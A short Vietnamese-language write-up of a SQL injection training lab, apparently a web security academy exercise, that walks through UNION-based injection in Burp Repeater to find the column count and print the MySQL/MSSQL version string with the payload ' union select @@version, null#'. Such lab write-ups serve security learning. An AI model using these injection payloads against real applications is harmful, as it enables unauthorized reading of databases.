# SQL Injection Lab 04: Database Version (MySQL/MSSQL)

## Mục tiêu
Khai thác SQLi để lấy chuỗi phiên bản cơ sở dữ liệu MySQL hoặc Microsoft SQL Server.

## Đề bài
<img src="images/04_mysql-mssql-version-2026-04-14-20-42-55.png" alt="Lab overview" width="760" />
<br><br>

## Bước 1: Bắt request trong Burp Repeater
<img src="images/04_mysql-mssql-version-2026-04-14-20-41-34.png" alt="Captured request" width="760" />
<br><br>

## Bước 2: Xác định số cột

```sql
' union select null, null#
```

<img src="images/04_mysql-mssql-version-2026-04-14-20-47-42.png" alt="Xác định số cột" width="760" />
<br><br>

## Bước 3: Kiểm tra cột hiển thị text

```sql
' union select 'abc','def'#
```

## Bước 4: Lấy phiên bản database

```sql
' union select @@version, null#
```

<img src="images/04_mysql-mssql-version-2026-04-14-20-53-04.png" alt="Kết quả version" width="760" />
<br><br>

## Payload solve

```sql
' union select @@version, null#
```

## Kết quả
Hiển thị thành công chuỗi version của DB và solve lab.
